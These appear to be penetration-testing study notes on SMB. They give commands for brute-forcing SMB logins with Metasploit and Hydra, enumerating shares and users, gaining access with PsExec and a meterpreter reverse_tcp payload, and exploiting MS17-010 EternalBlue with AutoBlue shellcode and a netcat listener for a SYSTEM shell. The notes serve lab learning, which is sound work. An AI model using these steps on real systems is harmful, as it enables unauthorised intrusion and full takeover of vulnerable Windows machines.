SMB uses port 445, though it originally ran on top of NetBIOS using Port 139
SAMBA is the open source Linux implementation of SMB, and allows Windows systems
to access Linux shares and devices.

SMB protocol uses two levels of authentication: User Auth and Share Auth

User Auth: Users must provide a user/pass to authenticate with the SMB server 
in order to access a share.

Share Auth: Users must provide a pass in order to access restricted share.

----------------------------------Tools--------------------------------------

PsExec - lightweight telnet-replacement developed by Microsoft that allows you to
execute processes on remote windows systems using any user's credentials. We can
use the PsExec utility to auth with the target system legitimately and run
arbitrary commands or launch a remote command prompt.

It is very similary to RDP, however instead of controlling the remote system 
via GUI, commands are sent via CMD

PsExec auth is performed via SMB. 

In order to utilize PsExec to gain access to a Windows target, we will need to
identify legit user accounts and their respective passwords or password hashes.

This can be done by leveraging various tools and techniques, however the most
common technique will involve performing an SMB login brute-force attack.

We can narrow down our brute-force attack to only include common Windows user
accounts like 'Administrator'

After we have obtained a legitimate user/pass we can use the creds to auth
with the target system via PsExec and execure arbitrary system commands
or obtain a reverse shell.

-----------------------------------------------------------------------------

nmap -sV -sC <ip>

service postgresql start && msfconsole
msfconsole
search smb_login
use auxiliary/smb/smb_login
** set user_file and pass_file **
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_user.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
** you may want to utilize a different set of user/pass files to ensure successs **

psexec.py Administrator@<ip> cmd.exe
whoami

--------------------------------Alternative Method---------------------------

search psexec (look for exploit/windows/smb/psexec) this is an alternative method that uploads a meterpreter session instead, still requires auth
getuid

-----------------------------------------------------------------------------

You can also use Hydra while sprcifying SMB to brute force login with unix users/passwords list, it is also worth noting it can be a good idea to replace the username
in the hydra settings with any passwords you find, so for example if you find admin:vagrant you should at some point try to search for vagrant specific passwords, this
is because password/user reuse is quite common.

Now to enumerate shares which can be done unauthenticated and authenticated for more access.
smbclient -L <IP> (enter -U <username> if you have credentials)
smbmap -u <user> -p <password> -H <IP> (this is also a good method to enumerate shares)
enum4linux -u <user> -p <pass> -U <IP> (this is a good way to enumerate other user accounts)

MSFConsole can also enumerate SMB users with modules

PSExec is also a good tool (use locate psexec.py to find it on your system)
chmod +x psexec.py (if necessary)
python3 psexec.py Administrator@<IP> (this will provide you with the highest level of priv on the windows system)
***Otherwise, MSFConsole has a psexec module***
set payload to windows/x64/meterpreter/reverse_tcp
set options (set necessary stuff)

sysinfo
getuid
getprivs
---------------------------MS17-010 EternalBlue Exploit----------------------

EternalBlue is the name given to a collection of Windows vulnerabilities and exploits
that allow attackers to remotely execute arbitrary code and gain access to a Windows
system and consequently the network that the target system is a part of.

The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1
protocol that allows attackers to send specially crafted packets that consequently
facilitate the execution of arbitrary commands.

This vulnerability affects multiple versions of Windows: Windows Vista,
Windows 7, Windows Server 2008, Windows 8.1, Windows 10, Windows Server 2016

EternalBlue exploit has a MSF auxiliary module that can be used to check if a target
system is vulnerable to the exploit and also has an exploit module that can be
used to exploit the vulnerability on unpatched systems, giving us a privileged
meterpreter session on the target system.



sudo nmap -sV -p 445 -O <ip>
** looking for SMB port and Microsoft version **
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 <ip>
** this will tell us if it is vulnerable **
** we can now use an tool called AutoBlue for exploitation **
cd shellcode
chmox +x shell_prep.sh
./shell_prep.sh

** enter the options the program asks for **
1 (generate regular command shell)
1 (generate stageless payload)
use the sc_x86.bin or x64 shellcode based on target OS architecture
nc -nvlp 1234 (whichever port you used during the AutoBlue config)
** now use eternalblue_exploit10,8,7 based on target OS and give it execute permissions **
chmod +x eternalblue_exploit7.py
python eternalblue eternalblue_exploit7.py <ip> shellcode/sc_x64.bin
** now on your NC listenery you should get a shell as system32 **
whoami --> nt authority\system

-------------------------Alternative Method----------------------------------

search eternalblue
auxiliary/scanner/smb/smb_ms17_010 (for checking is system is vulnerable)
exploit/windows/smb/ms17_010_eternalblue (the actual exploit)
use exploit/windows/smb/ms17_010_eternalblue
** set the required options **
** you will now get a meterpreter session **
getuid --> NT authority\system










